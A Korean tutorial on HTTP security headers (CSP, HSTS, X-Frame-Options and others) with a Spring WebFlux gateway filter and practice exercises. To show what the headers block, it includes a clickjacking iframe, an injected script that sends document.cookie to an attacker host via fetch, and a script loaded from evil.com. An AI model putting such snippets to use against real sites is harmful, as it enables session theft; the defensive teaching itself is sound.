# 🛡️ Security Headers 학습

> 브라우저 보안 기능을 활성화하여 XSS, Clickjacking 등을 방어하는 기법

**난이도**: ⭐⭐⭐ (중급)
**학습 시간**: 45분
**실습 시간**: 30분

---

## 🎯 학습 목표

이 문서를 마치면 다음을 할 수 있습니다:
- [ ] 주요 보안 헤더의 역할 이해하기
- [ ] CSP (Content Security Policy) 설정하기
- [ ] HSTS (HTTP Strict Transport Security) 적용하기
- [ ] WebFlux에서 응답 헤더 추가하기

---

## 1️⃣ 보안 헤더란?

### HTTP 응답 헤더의 역할

브라우저에게 보안 정책을 지시하는 메타데이터

```http
HTTP/1.1 200 OK
Content-Type: application/json
X-Content-Type-Options: nosniff          ← 보안 헤더
X-Frame-Options: DENY                     ← 보안 헤더
Content-Security-Policy: default-src 'self'  ← 보안 헤더
```

### 브라우저의 역할

```
┌──────────────────────────────────────────┐
│             Server                       │
│  "X-Frame-Options: DENY" 응답           │
└──────────────────────────────────────────┘
                  │
                  ▼
┌──────────────────────────────────────────┐
│             Browser                      │
│  헤더 확인 → iframe 로드 차단            │
│  사용자 보호                              │
└──────────────────────────────────────────┘
```

---

## 2️⃣ 주요 보안 헤더

### X-Content-Type-Options

**목적**: MIME 스니핑 방지

```http
X-Content-Type-Options: nosniff
```

**문제 상황**:
```
서버: Content-Type: text/plain
      실제 내용: <script>alert('XSS')</script>

브라우저 (구버전):
  "음... text/plain이지만 HTML처럼 보이네?"
  "HTML로 렌더링해야겠다!"
  → 스크립트 실행 (XSS)

브라우저 (nosniff 적용):
  "Content-Type: text/plain이면 텍스트로만 처리"
  → 스크립트 실행 차단 ✓
```

### X-Frame-Options

**목적**: Clickjacking 공격 방지

```http
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

**Clickjacking 공격**:
```html
<!-- 공격자 사이트 -->
<iframe src="https://bank.com/transfer?to=attacker&amount=1000"
        style="opacity: 0; position: absolute; top: 0;">
</iframe>

<button style="position: absolute; top: 0;">
  무료 선물 받기!
</button>
```

**피해 시나리오**:
```
1. 사용자가 "무료 선물 받기!" 버튼 클릭
2. 실제로는 투명한 iframe의 송금 버튼 클릭
3. 공격자에게 돈 송금됨
```

**방어**:
```http
X-Frame-Options: DENY
→ 브라우저가 iframe 로드 자체를 차단
```

### X-XSS-Protection

**목적**: 브라우저 내장 XSS 필터 활성화

```http
X-XSS-Protection: 1; mode=block
```

**동작**:
```
브라우저가 URL이나 입력에서 XSS 패턴 탐지
→ 페이지 렌더링 차단

예: http://site.com/search?q=<script>alert('XSS')</script>
→ "XSS 공격 감지! 페이지 로드 중단"
```

**참고**: 최신 브라우저(Chrome 78+)는 기본 비활성화
→ CSP로 대체 권장

### Content-Security-Policy (CSP)

**목적**: 리소스 로드 제한으로 XSS 방어

```http
Content-Security-Policy: default-src 'self';
                          script-src 'self' https://trusted.com;
                          style-src 'self' 'unsafe-inline'
```

**정책 설명**:
```
default-src 'self'
  → 모든 리소스는 같은 도메인에서만 로드

script-src 'self' https://trusted.com
  → 스크립트는:
    - 같은 도메인 OK
    - https://trusted.com OK
    - 다른 도메인 차단
    - 인라인 스크립트 (<script>...</script>) 차단

style-src 'self' 'unsafe-inline'
  → CSS는:
    - 같은 도메인 OK
    - 인라인 스타일 허용 (unsafe-inline)
```

**XSS 방어 효과**:
```html
<!-- 공격자가 삽입한 스크립트 -->
<script>
  fetch('https://attacker.com', {body: document.cookie});
</script>

<!-- CSP 적용 시 -->
❌ 차단됨: 인라인 스크립트 실행 불가
❌ 차단됨: https://attacker.com 로드 불가
```

### Strict-Transport-Security (HSTS)

**목적**: HTTPS 강제 사용

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Man-in-the-Middle 공격 방어**:
```
Without HSTS:
1. 사용자가 http://bank.com 입력
2. HTTP로 접속 시도
3. 공격자가 중간에서 가로채기
4. 가짜 사이트로 리다이렉트

With HSTS:
1. 사용자가 http://bank.com 입력
2. 브라우저: "이 사이트는 HSTS 설정됨"
3. 자동으로 https://bank.com으로 업그레이드
4. 공격자 차단
```

**설정 값**:
```
max-age=31536000
  → 1년간 HTTPS만 사용 (초 단위)

includeSubDomains
  → 서브도메인도 HTTPS 강제
  → api.bank.com, admin.bank.com 등

preload
  → 브라우저 HSTS Preload List에 등록 요청
  → 최초 방문부터 HTTPS 강제
```

### Referrer-Policy

**목적**: Referer 헤더 노출 제어

```http
Referrer-Policy: strict-origin-when-cross-origin
```

**Referer 헤더란?**:
```
사용자가 링크 클릭 시 이전 페이지 URL을 전달

예:
https://bank.com/account/123?session=abc  (현재 페이지)
   ↓ 링크 클릭
https://example.com
   ← Referer: https://bank.com/account/123?session=abc
```

**문제**: 민감한 정보(session, 계좌번호) 노출

**정책**:
```
strict-origin-when-cross-origin
  → 같은 사이트: 전체 URL 전송
  → 다른 사이트: 도메인만 전송
  → HTTPS → HTTP: 전송 안함

예:
bank.com → bank.com/other
  → Referer: https://bank.com/account/123

bank.com → example.com
  → Referer: https://bank.com (경로 숨김)
```

### Permissions-Policy

**목적**: 브라우저 기능 접근 제한

```http
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

**제한 가능한 기능**:
```
geolocation    → GPS 위치
microphone     → 마이크
camera         → 카메라
payment        → 결제 API
usb            → USB 디바이스
```

**설정**:
```
geolocation=()
  → 아무도 GPS 사용 불가

geolocation=(self)
  → 현재 사이트만 GPS 사용

geolocation=(self "https://maps.com")
  → 현재 사이트와 maps.com만 GPS 사용
```

---

## 3️⃣ 프로젝트 구현

### SecurityHeadersProperties

```java
// services/api-gateway/.../config/SecurityHeadersProperties.java

@ConfigurationProperties(prefix = "security.headers")
@Getter
@Setter
public class SecurityHeadersProperties {

    private boolean enabled = true;
    private boolean contentTypeOptions = true;
    private String frameOptions = "DENY";
    private boolean xssProtection = true;
    private String referrerPolicy = "strict-origin-when-cross-origin";
    private String permissionsPolicy = "geolocation=(), microphone=(), camera=()";

    private CspProperties csp = new CspProperties();
    private HstsProperties hsts = new HstsProperties();
    private CacheControlProperties cacheControl = new CacheControlProperties();

    @Getter
    @Setter
    public static class CspProperties {
        private boolean enabled = true;
        private boolean reportOnly = false;
        private String policy = "default-src 'self'; " +
                                "script-src 'self' 'unsafe-inline'; " +
                                "style-src 'self' 'unsafe-inline'";
    }

    @Getter
    @Setter
    public static class HstsProperties {
        private boolean enabled = true;
        private boolean httpsOnly = true;
        private long maxAge = 31536000;  // 1년
        private boolean includeSubDomains = true;
        private boolean preload = false;
    }
}
```

### SecurityHeadersFilter

```java
// SecurityHeadersFilter.java

@Component
@Slf4j
@RequiredArgsConstructor
@Order(Ordered.HIGHEST_PRECEDENCE)
public class SecurityHeadersFilter implements GlobalFilter {

    private final SecurityHeadersProperties properties;

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        if (!properties.isEnabled()) {
            return chain.filter(exchange);
        }

        // ⚠️ 중요: beforeCommit 사용
        // 응답이 커밋되기 전에 헤더 추가
        exchange.getResponse().beforeCommit(() -> {
            addSecurityHeaders(exchange);
            return Mono.empty();
        });

        return chain.filter(exchange);
    }

    private void addSecurityHeaders(ServerWebExchange exchange) {
        ServerHttpResponse response = exchange.getResponse();
        HttpHeaders headers = response.getHeaders();

        // X-Content-Type-Options
        if (properties.isContentTypeOptions()) {
            headers.add("X-Content-Type-Options", "nosniff");
        }

        // X-Frame-Options
        if (properties.getFrameOptions() != null) {
            headers.add("X-Frame-Options", properties.getFrameOptions());
        }

        // X-XSS-Protection
        if (properties.isXssProtection()) {
            headers.add("X-XSS-Protection", "1; mode=block");
        }

        // Referrer-Policy
        if (properties.getReferrerPolicy() != null) {
            headers.add("Referrer-Policy", properties.getReferrerPolicy());
        }

        // Permissions-Policy
        if (properties.getPermissionsPolicy() != null) {
            headers.add("Permissions-Policy", properties.getPermissionsPolicy());
        }

        // Content-Security-Policy
        addContentSecurityPolicy(headers);

        // HSTS
        addHstsHeader(exchange.getRequest(), headers);

        // Cache-Control (인증 경로)
        addCacheControlHeader(
            exchange.getRequest().getPath().value(),
            headers
        );
    }

    private void addContentSecurityPolicy(HttpHeaders headers) {
        CspProperties csp = properties.getCsp();
        if (!csp.isEnabled()) return;

        String headerName = csp.isReportOnly()
            ? "Content-Security-Policy-Report-Only"
            : "Content-Security-Policy";

        headers.add(headerName, csp.getPolicy());
    }

    private void addHstsHeader(ServerHttpRequest request, HttpHeaders headers) {
        HstsProperties hsts = properties.getHsts();
        if (!hsts.isEnabled()) return;

        // HTTPS 요청인 경우에만 HSTS 헤더 추가
        if (hsts.isHttpsOnly() && !isHttpsRequest(request)) {
            return;
        }

        StringBuilder value = new StringBuilder();
        value.append("max-age=").append(hsts.getMaxAge());

        if (hsts.isIncludeSubDomains()) {
            value.append("; includeSubDomains");
        }

        if (hsts.isPreload()) {
            value.append("; preload");
        }

        headers.add("Strict-Transport-Security", value.toString());
    }

    private boolean isHttpsRequest(ServerHttpRequest request) {
        // X-Forwarded-Proto 헤더 확인 (프록시 환경)
        String proto = request.getHeaders().getFirst("X-Forwarded-Proto");
        if (proto != null) {
            return "https".equalsIgnoreCase(proto);
        }

        // URI scheme 확인
        return "https".equalsIgnoreCase(request.getURI().getScheme());
    }
}
```

---

## 4️⃣ WebFlux 비동기 처리 주의사항

### ❌ 잘못된 패턴

```java
// 문제: 응답이 이미 커밋된 후 실행
return chain.filter(exchange).then(
    Mono.fromRunnable(() -> addHeaders(exchange))
);
```

**발생하는 문제**:
```
1. chain.filter() 실행 → 응답 전송 시작
2. 응답 스트림이 클라이언트로 전송
3. then() 블록 실행 → 헤더 추가 시도
4. ❌ 이미 커밋됨 → 헤더 추가 불가
5. ❌ Chunked Encoding 오류 발생
```

### ✅ 올바른 패턴

```java
// beforeCommit: 응답 커밋 직전에 실행
exchange.getResponse().beforeCommit(() -> {
    addHeaders(exchange);
    return Mono.empty();
});

return chain.filter(exchange);
```

**동작 순서**:
```
1. beforeCommit 콜백 등록
2. chain.filter() 실행
3. 응답 준비 완료
4. ⏸️ 커밋 직전 멈춤
5. ✅ beforeCommit 콜백 실행 → 헤더 추가
6. ✅ 응답 커밋 및 전송
```

---

## ✍️ 실습 과제

### 과제 1: 헤더 확인 (기초)

브라우저 개발자 도구에서 보안 헤더를 확인하세요.

```bash
# cURL로 확인
curl -I http://localhost:8080/api/auth/login

# 예상 응답
HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

**확인사항**:
- [ ] 모든 보안 헤더가 포함되어 있는가?
- [ ] CSP 정책이 올바른가?
- [ ] HSTS max-age가 1년인가?

### 과제 2: CSP 위반 테스트 (중급)

CSP를 위반하는 스크립트를 삽입하고 차단을 확인하세요.

```vue
<!-- Frontend -->
<template>
  <div>
    <!-- ❌ CSP 위반: 인라인 스크립트 -->
    <button onclick="alert('Blocked!')">
      Click Me
    </button>

    <!-- ❌ CSP 위반: 외부 도메인 스크립트 -->
    <script src="https://evil.com/malicious.js"></script>
  </div>
</template>
```

**브라우저 콘솔 확인**:
```
Refused to execute inline script because it violates the following
Content Security Policy directive: "script-src 'self'".
Either the 'unsafe-inline' keyword, a hash ('sha256-...'),
or a nonce ('nonce-...') is required to enable inline execution.
```

### 과제 3: HSTS Preload 등록 (고급)

사이트를 HSTS Preload List에 등록하세요.

**단계**:
1. HSTS 헤더 설정 확인
   ```http
   Strict-Transport-Security: max-age=31536000;
                              includeSubDomains;
                              preload
   ```

2. [hstspreload.org](https://hstspreload.org) 접속

3. 도메인 입력 및 조건 확인
   - HTTPS 제공
   - 모든 서브도메인 HTTPS 리다이렉트
   - max-age >= 31536000 (1년)
   - includeSubDomains 포함
   - preload 포함

4. 등록 신청

**효과**:
- 브라우저가 최초 방문부터 HTTPS 강제
- MITM 공격 완전 차단

---

## 🔍 더 알아보기

### CSP Nonce

인라인 스크립트 허용하되 XSS 방어

```java
// 서버: 매 요청마다 랜덤 nonce 생성
String nonce = UUID.randomUUID().toString();
response.setHeader(
    "Content-Security-Policy",
    "script-src 'self' 'nonce-" + nonce + "'"
);

// HTML에 nonce 포함
<script nonce="${nonce}">
  // 이 스크립트만 실행 가능
  console.log('Allowed');
</script>

// 공격자가 삽입한 스크립트 (nonce 없음)
<script>
  // ❌ 차단됨
  alert('XSS');
</script>
```

### CSP Report URI

CSP 위반 로그 수집

```http
Content-Security-Policy: default-src 'self';
                          report-uri /api/csp-report
```

```java
@PostMapping("/api/csp-report")
public void handleCspReport(@RequestBody CspReport report) {
    log.warn("CSP Violation: {}", report);
    // 보안 팀에 알림
}
```

### Security Headers 테스트

자동화 도구 사용

```bash
# securityheaders.com
curl https://securityheaders.com/?q=yourdomain.com&followRedirects=on

# Mozilla Observatory
curl https://http-observatory.security.mozilla.org/api/v1/analyze?host=yourdomain.com
```

---

## 🎯 체크리스트

학습을 마쳤다면 체크해보세요:

- [ ] 주요 보안 헤더의 역할을 설명할 수 있다
- [ ] CSP 정책을 설정할 수 있다
- [ ] HSTS의 동작 원리를 이해한다
- [ ] WebFlux에서 beforeCommit을 사용해야 하는 이유를 안다
- [ ] 실제 프로젝트에서 보안 헤더를 확인했다

---

## 📚 참고 자료

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [Content Security Policy (CSP) Reference](https://content-security-policy.com/)
- [HSTS Preload List](https://hstspreload.org/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

---

**이전**: [Input Validation](./06-input-validation.md)
**다음**: [학습 가이드 홈으로](./README.md) →
